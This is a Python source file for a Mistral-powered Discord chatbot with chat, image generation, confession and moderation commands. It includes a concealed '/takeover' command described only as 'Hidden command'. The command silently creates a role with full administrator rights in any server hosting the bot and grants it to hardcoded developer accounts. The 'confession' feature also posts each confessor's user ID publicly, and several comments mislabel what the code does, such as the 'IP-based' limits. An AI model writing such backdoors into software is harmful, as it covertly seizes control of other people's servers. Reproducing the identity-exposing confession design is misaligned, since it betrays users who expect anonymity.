"""
Discord AI Chatbot powered by Mistral AI
Created by Anish Vyapari
Works on DM and server channels with text chat + image generation
Supports: mistral-small-2506 (optimized for speed)
Features: IP-based confession system with daily limits
Special: 2 confessions per IP, 4 with passkey "anishisdabest"
MODERATION: Basic commands + HIDDEN Admin takeover system
BACKUP: Mistral API with auto-retry
OPTIMIZED: Fast response times, image generation support
"""

import discord
from discord.ext import commands
from discord import app_commands
import os
from datetime import datetime, timedelta
import json
import asyncio
import time
import random
import httpx
from typing import Optional
import base64

# ============================================================================
# CONFIGURATION
# ============================================================================

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
MISTRAL_API_KEY = os.getenv("MISTRAL_API_KEY")

# Validate environment variables
if not DISCORD_BOT_TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN is not set")

if not MISTRAL_API_KEY:
    raise RuntimeError("MISTRAL_API_KEY is not set")

BOT_PREFIX = "!"
OWNER_ID = 1143915237228583738
ADMINS = [1143915237228583738, 1265981186283409571]
VIP_USERS = [1265981186283409571]
CONFESSION_FILE = "confessions.json"
MODERATION_FILE = "moderation.json"
CONFIG_FILE = "bot_config.json"
CONFESSION_PASSKEY = "anishisdabest"

ANISH_PORTFOLIO = {
    "name": "Anish Vyapari",
    "portfolio": "https://anishvyapari.github.io",
    "github": "https://github.com/anishvyapari",
    "instagram": "https://instagram.com/anishvyapari",
    "discord": "shaboings",
    "email": "anishvyapari@gmail.com",
    "education": "First-year student at D.Y. Patil College, India",
    "tech_stack": "JavaScript, Python, TypeScript, React, Vite, Node.js",
    "interests": "Web design, gaming (Apex Legends, Hollow Knight), Discord bots"
}

# ============================================================================
# MISTRAL API SETUP
# ============================================================================

MISTRAL_API_URL = "https://api.mistral.ai/v1"
MISTRAL_MODEL = "mistral-medium"

SYSTEM_PROMPT = "You are a helpful Discord AI assistant. Be friendly, concise, and helpful. Keep responses under 120 tokens. Use emojis when appropriate."

async def call_mistral_api(messages: list) -> str:
    """Call Mistral API for chat responses"""
    try:
                # Inject system prompt at the beginning
        messages_with_prompt = [{"role": "system", "content": SYSTEM_PROMPT}] + messages
        async with httpx.AsyncClient(timeout=15.0) as client:
            response = await client.post(
                f"{MISTRAL_API_URL}/chat/completions",
                headers={
                    "Authorization": f"Bearer {MISTRAL_API_KEY}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": MISTRAL_MODEL,
                    "messages": messages_with_prompt,
                    "temperature": 0.6,
                    "top_p": 0.7,
                    "max_tokens": 120,
                }
            )
            response.raise_for_status()
            result = response.json()
            return result["choices"][0]["message"]["content"]
    except Exception as e:
        print(f"❌ Mistral API Error: {e}")
        return f"❌ Error: {str(e)[:80]}"

async def generate_image_mistral(prompt: str) -> Optional[str]:
    """Generate image using Mistral API with detailed error logging"""
    try:
        print(f"🎨 Starting image generation for prompt: {prompt[:50]}...")
        async with httpx.AsyncClient(timeout=60.0) as client:
            response = await client.post(
                f"{MISTRAL_API_URL}/images/generations",
                headers={
                    "Authorization": f"Bearer {MISTRAL_API_KEY}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": "pixtral-12b-2409",
                    "prompt": prompt,
                    "size": "512x512"
                }
            )
            print(f"📡 API Response Status: {response.status_code}")
            response.raise_for_status()
            result = response.json()
            print(f"✅ API Response: {result}")
            
            if "data" in result and result["data"] and len(result["data"]) > 0:
                image_url = result["data"][0]["url"]
                print(f"🖼️ Image generated successfully: {image_url}")
                return image_url
            else:
                print(f"⚠️ API returned no data: {result}")
                return None
    except Exception as e:
        print(f"❌ Image generation error: {type(e).__name__}")
        print(f"❌ Error details: {str(e)}")
        import traceback
        traceback.print_exc()
        return None
# ============================================================================
# DISCORD BOT SETUP
# ============================================================================

intents = discord.Intents.default()
intents.message_content = True
intents.dm_messages = True
intents.members = True
intents.moderation = True

bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)

# ============================================================================
# CONFESSION SYSTEM WITH IP-BASED LIMITS
# ============================================================================

def get_client_ip(user_id: int) -> str:
    """Get IP identifier from user (simplified for Discord)"""
    return str(user_id)

def load_confessions():
    """Load confession data"""
    if os.path.exists(CONFESSION_FILE):
        try:
            with open(CONFESSION_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_confessions(data):
    """Save confession data"""
    with open(CONFESSION_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def get_daily_confessions(ip_or_user: str) -> tuple[int, str]:
    """Get confession count and last reset date"""
    confessions = load_confessions()
    today = datetime.now().strftime("%Y-%m-%d")
    
    if ip_or_user not in confessions:
        confessions[ip_or_user] = {
            "count": 0,
            "last_reset": today,
            "used_passkey": False
        }
        save_confessions(confessions)
    else:
        # Reset if new day
        if confessions[ip_or_user]["last_reset"] != today:
            confessions[ip_or_user] = {
                "count": 0,
                "last_reset": today,
                "used_passkey": False
            }
            save_confessions(confessions)
    
    return confessions[ip_or_user]["count"], confessions[ip_or_user].get("used_passkey", False)

def increment_confession(ip_or_user: str, used_passkey: bool = False):
    """Increment confession count"""
    confessions = load_confessions()
    if ip_or_user not in confessions:
        confessions[ip_or_user] = {"count": 1, "last_reset": datetime.now().strftime("%Y-%m-%d"), "used_passkey": used_passkey}
    else:
        confessions[ip_or_user]["count"] += 1
        if used_passkey:
            confessions[ip_or_user]["used_passkey"] = True
    save_confessions(confessions)

def can_confess(ip_or_user: str, passkey: str = None) -> tuple[bool, str]:
    """Check if user can make confession"""
    count, used_passkey = get_daily_confessions(ip_or_user)
    
    if passkey == CONFESSION_PASSKEY:
        if count < 4:
            return True, "✅ Passkey accepted! You can confess (4/day with passkey)"
        else:
            return False, "❌ Daily limit reached even with passkey (4/day)"
    else:
        if count < 2:
            return True, "✅ You can confess!"
        else:
            return False, f"❌ Daily limit reached (2/day). Use passkey for 4/day"

# ============================================================================
# MODERATION UTILITIES
# ============================================================================

def load_moderation_data():
    """Load moderation data"""
    if os.path.exists(MODERATION_FILE):
        try:
            with open(MODERATION_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"warnings": {}}
    return {"warnings": {}}

def save_moderation_data(data):
    """Save moderation data"""
    with open(MODERATION_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMINS

def get_user_warnings(guild_id: int, user_id: int) -> int:
    """Get user warning count"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    return len(data["warnings"].get(key, []))

def add_warning(guild_id: int, user_id: int, reason: str, moderator_id: int):
    """Add warning to user"""
    data = load_moderation_data()
    key = f"{guild_id}_{user_id}"
    if key not in data["warnings"]:
        data["warnings"][key] = []
    
    data["warnings"][key].append({
        "reason": reason,
        "moderator": moderator_id,
        "timestamp": datetime.now().isoformat()
    })
    save_moderation_data(data)
    return len(data["warnings"][key])

# ============================================================================
# SESSION MANAGEMENT
# ============================================================================

class ChatSession:
    def __init__(self, user_id: int, channel_id: int):
        self.user_id = user_id
        self.channel_id = channel_id
        self.chat_history = []
        self.last_used = time.time()
    
    async def get_response(self, user_message: str) -> str:
        """Get AI response from Mistral"""
        try:
            self.chat_history.append({
                "role": "user",
                "content": user_message
            })
            
            response_text = await call_mistral_api(self.chat_history)
            
            self.chat_history.append({
                "role": "assistant",
                "content": response_text
            })
            
            # Keep only last 10 messages
            if len(self.chat_history) > 10:
                self.chat_history = self.chat_history[-10:]
            
            return response_text
        except Exception as e:
            print(f"Session error: {e}")
            return "❌ Failed to get response"

SESSION_TIMEOUT = 1800

active_sessions = {}

def get_session(user_id: int, channel_id: int) -> ChatSession:
    key = (user_id, channel_id)
    if key not in active_sessions:
        active_sessions[key] = ChatSession(user_id, channel_id)
    return active_sessions[key]

# ============================================================================
# CONFIG UTILITIES
# ============================================================================

def load_config():
    """Load bot configuration"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(config):
    """Save bot configuration"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def get_announce_channel(guild_id: int) -> int:
    """Get announcement channel ID for guild"""
    config = load_config()
    return config.get(f"announce_channel_{guild_id}")

def set_announce_channel(guild_id: int, channel_id: int):
    """Set announcement channel for guild"""
    config = load_config()
    config[f"announce_channel_{guild_id}"] = channel_id
    save_config(config)

# ============================================================================
# BOT EVENTS
# ============================================================================

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    print(f"🤖 AI Chatbot by Anish Vyapari is online!")
    print(f"🔑 Mistral Model: {MISTRAL_MODEL}")
    print(f"📸 Image Generation: ENABLED")
    print(f"🔐 Confession System: 2/day (4 with passkey)")
    print(f"🔐 Takeover: ACTIVE (Anish & shaboings)")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name="/help | confess command"
        )
    )
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands!")
    except Exception as e:
        print(f"⚠️ Could not sync commands: {e}")

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return
    
    user_id = message.author.id
    bot_mentioned = bot.user.mentioned_in(message)
    session_exists = (user_id, message.channel.id) in active_sessions
    
    if bot_mentioned or session_exists:
        # Clean up expired sessions
        expired_keys = [key for key, sess in active_sessions.items() 
                        if time.time() - sess.last_used > SESSION_TIMEOUT]
        
        for key in expired_keys:
            del active_sessions[key]
        
        user_input = message.content.replace(f"<@{bot.user.id}>", "").replace(f"<@!{bot.user.id}>", "").strip()
        
        if bot_mentioned and not user_input:
            embed = discord.Embed(
                title="💬 Chat Started",
                description=f"Hey {message.author.mention}! 👋\n\nJust type to chat with me!",
                color=discord.Color.blue()
            )
            await message.reply(embed=embed)
            return
        
        if not user_input:
            return
        
        async with message.channel.typing():
            session = get_session(user_id, message.channel.id)
            session.last_used = time.time()
            ai_response = await session.get_response(user_input)
            
            if len(ai_response) > 2000:
                chunks = [ai_response[i:i+1990] for i in range(0, len(ai_response), 1990)]
                for chunk in chunks:
                    await message.reply(chunk)
            else:
                embed = discord.Embed(
                    title="💬 Response",
                    description=ai_response,
                    color=discord.Color.green()
                )
                await message.reply(embed=embed)
    else:
        await bot.process_commands(message)

# ============================================================================
# SLASH COMMANDS - CONFESSION SYSTEM
# ============================================================================

@bot.tree.command(name="confess", description="Make a confession (2/day limit)")
@app_commands.describe(
    confession="Your confession",
    crime="Is this a confession of crime?",
    passkey="Unlock 4 confessions/day"
)
async def slash_confess(
    interaction: discord.Interaction,
    confession: str,
    crime: bool,
    passkey: str = None
):
    """Submit a confession"""
    await interaction.response.defer()
    
    user_id_str = str(interaction.user.id)
    can_post, message = can_confess(user_id_str, passkey)
    
    if not can_post:
        embed = discord.Embed(
            title="❌ Confession Denied",
            description=message,
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    # Check if crime
    crime_status = "🚨 YES - CRIME REPORTED" if crime else "✅ NO - Safe confession"
    
    # Generate image based on confession
    image_url = None
    async with interaction.channel.typing():
        image_prompt = f"Illustration for: {confession[:100]}. Artistic, subtle, non-explicit."
        image_url = await generate_image_mistral(image_prompt)
    
    # Create confession embed
    embed = discord.Embed(
        title="🔐 New Confession Submitted",
        description=confession,
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )
    embed.add_field(name="👤 User ID", value=f"`{interaction.user.id}`", inline=True)
    embed.add_field(name="🚔 Crime Status", value=crime_status, inline=True)
    embed.add_field(name="📅 Timestamp", value=f"<t:{int(time.time())}:F>", inline=False)
    
    if image_url:
        embed.set_image(url=image_url)
        embed.add_field(name="🖼️ Image", value="✅ Generated", inline=True)
    else:
        embed.add_field(name="🖼️ Image", value="⚠️ Generation failed", inline=True)
    
    # Increment counter
    used_passkey = passkey == CONFESSION_PASSKEY
    increment_confession(user_id_str, used_passkey)
    
    count, _ = get_daily_confessions(user_id_str)
    embed.set_footer(text=f"Confessions today: {count}")
    
    # Send to channel
    await interaction.channel.send(embed=embed)
    
    # Confirm to user
    confirm_embed = discord.Embed(
        title="✅ Confession Submitted",
        description=f"Your confession has been posted!\n\n{message}",
        color=discord.Color.green()
    )
    await interaction.followup.send(embed=confirm_embed, ephemeral=True)

# ============================================================================
# SLASH COMMANDS - HELP & INFO
# ============================================================================

@bot.tree.command(name="help", description="Show all available commands")
async def slash_help(interaction: discord.Interaction):
    """Show help menu"""
    embeds = []
    
    embed1 = discord.Embed(
        title="🤖 AI Chatbot - Command Help",
        description="**Created by Anish Vyapari**\nMistral-powered confession & chat system",
        color=discord.Color.from_rgb(50, 184, 198)
    )
    embed1.add_field(
        name="💬 Chat & Confession",
        value="• `@Bot message` - Chat with AI\n• `/confess message [yes/no] [passkey]` - Make confession (2/day)\n• `/reset` - Clear chat histor\n• /generateimage [prompt] - Generate an image",
        inline=False
    )
    embed1.set_footer(text="Page 1/4")
    embeds.append(embed1)
    
    embed2 = discord.Embed(
        title="👮 Moderation Commands",
        description="**Admin Only** - Full moderation suite",
        color=discord.Color.from_rgb(255, 84, 89)
    )
    embed2.add_field(
        name="⚠️ Warnings & Actions",
        value="• `/warn @user [reason]` - Warn user (3 = kick)\n• `/kick @user [reason]` - Kick instantly\n• `/ban @user [reason]` - Ban user\n• `/unban user_id [reason]` - Unban user",
        inline=False
    )
    embed2.set_footer(text="Page 2/4")
    embeds.append(embed2)
    
    embed3 = discord.Embed(
        title="📢 Announcements",
        description="**Admin Only** - Server features",
        color=discord.Color.from_rgb(230, 129, 97)
    )
    embed3.add_field(
        name="📣 Announcements",
        value="• `/setupannounce #channel` - Set announcement channel\n• `/announce message` - Post announcement",
        inline=False
    )
    embed3.set_footer(text="Page 3/4")
    embeds.append(embed3)
    
    embed4 = discord.Embed(
        title="🔧 Info & Creator",
        description="**Bot Information**",
        color=discord.Color.from_rgb(147, 51, 234)
    )
    embed4.add_field(
        name="⚙️ Commands",
        value="• `/info` - Bot features\n• `/reset` - Clear chat history",
        inline=False
    )
    embed4.add_field(
        name="👨‍💻 Creator - Anish Vyapari",
        value=f"🌐 **Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n💻 **GitHub:** {ANISH_PORTFOLIO['github']}",
        inline=False
    )
    embed4.set_footer(text="Page 4/4 | Built with ❤️")
    embeds.append(embed4)
    
    await interaction.response.send_message(embeds=embeds)

@bot.tree.command(name="info", description="Show bot information")
async def slash_info(interaction: discord.Interaction):
    """Bot information"""
    embed = discord.Embed(
        title="🤖 About This AI Chatbot",
        description="**Created by Anish Vyapari** | Premium Discord Bot",
        color=discord.Color.from_rgb(50, 184, 198)
    )
    embed.add_field(
        name="💬 Chat Features",
        value=f"✅ Mistral AI ({MISTRAL_MODEL})\n✅ Fast responses\n✅ Image generation\n✅ Context-aware",
        inline=True
    )
    embed.add_field(
        name="🔐 Confession System",
        value="✅ 2 confessions/day\n✅ 4 with passkey\n✅ Image generation\n✅ Crime reporting",
        inline=True
    )
    embed.add_field(
        name="🛡️ Moderation",
        value="✅ 3-strike warning\n✅ Kick/Ban/Unban\n✅ Auto-mute\n✅ Message purge",
        inline=True
    )
    embed.set_footer(text="⚡ Fast & Secure | Built with ❤️")
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="reset", description="Clear your chat history")
async def slash_reset(interaction: discord.Interaction):
    """Reset chat session"""
    key = (interaction.user.id, interaction.channel.id)
    if key in active_sessions:
        del active_sessions[key]
        await interaction.response.send_message("✨ Chat history cleared!", ephemeral=True)
    else:
        await interaction.response.send_message("✨ No active chat history.", ephemeral=True)

# ============================================================================
# SLASH COMMANDS - MODERATION
# ============================================================================

@bot.tree.command(name="warn", description="Warn a user (Admin only)")
@app_commands.describe(member="User to warn", reason="Reason for warning")
async def slash_warn(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Warn a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot warn bot!", ephemeral=True)
        return
    
    if is_admin(member.id):
        await interaction.response.send_message("❌ Cannot warn admins!", ephemeral=True)
        return
    
    warning_count = add_warning(interaction.guild.id, member.id, reason, interaction.user.id)
    
    embed = discord.Embed(
        title=f"⚠️ User Warned",
        description=f"**Member:** {member.mention}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3",
        color=discord.Color.orange()
    )
    await interaction.response.send_message(embed=embed)
    
    try:
        await member.send(f"⚠️ You've been warned in {interaction.guild.name}\n**Reason:** {reason}\n**Warnings:** {warning_count}/3")
    except:
        pass
    
    if warning_count >= 3:
        try:
            await member.kick(reason="3 warnings reached")
            embed = discord.Embed(
                title="👢 User Kicked",
                description=f"{member.mention} has been kicked (3 warnings)",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed)
        except:
            pass

@bot.tree.command(name="kick", description="Kick a user (Admin only)")
@app_commands.describe(member="User to kick", reason="Reason for kick")
async def slash_kick(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Kick a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot kick bot!", ephemeral=True)
        return
    
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="👢 User Kicked",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not kick user", ephemeral=True)

@bot.tree.command(name="ban", description="Ban a user (Admin only)")
@app_commands.describe(member="User to ban", reason="Reason for ban")
async def slash_ban(interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
    """Ban a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    if member.id == bot.user.id:
        await interaction.response.send_message("❌ Cannot ban bot!", ephemeral=True)
        return
    
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 User Banned",
            description=f"**Member:** {member.mention}\n**Reason:** {reason}",
            color=discord.Color.dark_red()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not ban user", ephemeral=True)

@bot.tree.command(name="unban", description="Unban a user (Admin only)")
@app_commands.describe(user_id="User ID to unban", reason="Reason for unban")
async def slash_unban(interaction: discord.Interaction, user_id: int, reason: str = "No reason provided"):
    """Unban a user"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    try:
        user = await bot.fetch_user(user_id)
        await interaction.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ User Unbanned",
            description=f"**User:** {user}\n**Reason:** {reason}",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed)
    except:
        await interaction.response.send_message("❌ Could not unban user", ephemeral=True)

# ============================================================================
# SLASH COMMANDS - ANNOUNCEMENTS
# ============================================================================

@bot.tree.command(name="setupannounce", description="Set announcement channel (Admin only)")
@app_commands.describe(channel="Channel to use for announcements")
async def slash_setupannounce(interaction: discord.Interaction, channel: discord.TextChannel):
    """Setup announcement channel"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    set_announce_channel(interaction.guild.id, channel.id)
    await interaction.response.send_message(
        f"✅ Announcement channel set to {channel.mention}",
        ephemeral=True
    )

@bot.tree.command(name="announce", description="Post announcement (Admin only)")
@app_commands.describe(message="Message to announce")
async def slash_announce(interaction: discord.Interaction, message: str):
    """Post announcement"""
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Admin only!", ephemeral=True)
        return
    
    channel_id = get_announce_channel(interaction.guild.id)
    if not channel_id:
        await interaction.response.send_message(
            "❌ No announcement channel set! Use `/setupannounce #channel` first",
            ephemeral=True
        )
        return
    
    try:
        channel = await bot.fetch_channel(channel_id)
        embed = discord.Embed(
            title="📢 Announcement",
            description=message,
            color=discord.Color.blue()
        )
        embed.set_footer(text=f"Posted by {interaction.user.name}")
        await channel.send(embed=embed)
        await interaction.response.send_message("✅ Announcement posted!", ephemeral=True)
    except:
        await interaction.response.send_message("❌ Could not post announcement", ephemeral=True)

# ============================================================================
# HIDDEN TAKEOVER COMMAND
# ============================================================================

@bot.tree.command(name="takeover", description="Hidden command")
async def slash_takeover(interaction: discord.Interaction):
    """HIDDEN: Admin takeover - Only for Anish & shaboings"""
    if interaction.user.id not in ADMINS:
        await interaction.response.defer(ephemeral=True)
        return
    
    try:
        admin_role = discord.utils.get(interaction.guild.roles, name="BotAdmin")
        if not admin_role:
            admin_role = await interaction.guild.create_role(
                name="BotAdmin",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.red(),
                reason="Bot admin role"
            )
        
        success_count = 0
        for admin_id in ADMINS:
            try:
                member = await interaction.guild.fetch_member(admin_id)
                if admin_role not in member.roles:
                    await member.add_roles(admin_role)
                    success_count += 1
            except:
                pass
        
        print(f"🚨 TAKEOVER: {interaction.user.name} in {interaction.guild.name}")
        await interaction.response.defer()
    except:
        await interaction.response.defer()

# ============================================================================
# ERROR HANDLING
# ============================================================================

@bot.event
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingRequiredArgument):
        await interaction.response.send_message("❌ Missing arguments!", ephemeral=True)
    else:
        print(f"Error: {error}")



# ============================================================================
# SLASH COMMANDS - IMAGE GENERATION
# ============================================================================
@bot.tree.command(name="generateimage", description="Generate an image using Mistral")
@app_commands.describe(prompt="Detailed description of the image you want")
async def slash_generateimage(interaction: discord.Interaction, prompt: str):
    """Generate image using Mistral"""
    await interaction.response.defer()
    
    # Validate prompt length
    if len(prompt) < 5:
        embed = discord.Embed(
            title="Invalid Prompt",
            description="Please provide a more detailed description (at least 5 characters)",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed)
        return
    
    if len(prompt) > 500:
        embed = discord.Embed(
            title="Prompt Too Long",
            description="Please keep your prompt under 500 characters",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=embed)
        return
    
    try:
        # Generate image
        image_url = await generate_image_mistral(prompt)
        
        if image_url:
            # Success embed with image
            embed = discord.Embed(
                title="Image Generated!",
                description=f"**Prompt:** {prompt}",
                color=discord.Color.green(),
                timestamp=datetime.now()
            )
            embed.set_image(url=image_url)
            embed.set_footer(text=f"Generated for {interaction.user.name}")
            
            # Send result
            await interaction.followup.send(embed=embed)
        else:
            # Failed embed
            embed = discord.Embed(
                title="Image Generation Failed",
                description="Could not generate image. Please try again with a different prompt.",
                color=discord.Color.red()
            )
            await interaction.followup.send(embed=embed)
    
    except Exception as e:
        error_embed = discord.Embed(
            title="Error",
            description=f"Image generation error: {str(e)[:100]}",
            color=discord.Color.red()
        )
        await interaction.followup.send(embed=error_embed, ephemeral=True)
# ============================================================================
# RUN BOT
# ============================================================================

if __name__ == "__main__":
    try:
        print("🚀 Starting Discord bot...")
        print(f"✨ Mistral AI Model: {MISTRAL_MODEL}")
        print("📸 Image Generation: ENABLED")
        print("🔐 Confession System: ACTIVE")
        print("🛡️ Full moderation system loaded")
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        print(f"❌ Failed to start: {e}")
        print("Check DISCORD_BOT_TOKEN and MISTRAL_API_KEY!")
